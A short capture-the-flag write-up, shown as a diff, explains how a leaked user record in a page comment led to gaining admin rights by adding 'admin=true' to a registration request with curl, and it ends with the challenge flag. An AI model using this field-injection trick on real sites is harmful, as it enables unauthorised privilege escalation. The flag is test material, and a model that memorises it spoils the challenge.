@@ -1,0 +1,20 @@
+Upon registering and logging in, we are met with a message saying that we are not admin.
+Looking at the source of the page reveals the following:
+
+<!--
+Error: user.admin is not equal to true.
+{
+	"_id": "5708479b9c95b4060089562b",
+	"username": "username",
+	"password": "$2a$10$DxaT/Su/XgKPt2GNo..4kOJCZrPIsHoU1VOTw.rgja8KpkvnK/HzK",
+	"uid": "9hrbgazb0bzuan7ije9cis8fd"
+}
+-->
+
+Looking at the javascript used to register a user, it seems like we can inject values into the post request, and
+those values will show up in our user config.
+Since our user is not admin, let's create a user that is.
+
+$ curl cpanel.sctf.michaelz.xyz/api/user/register --data "_csrf=fake&username=insane&password=password&admin=true"
+
+sctf{TIL_noSql_cAn_bE_InjeKT3d_t0o}
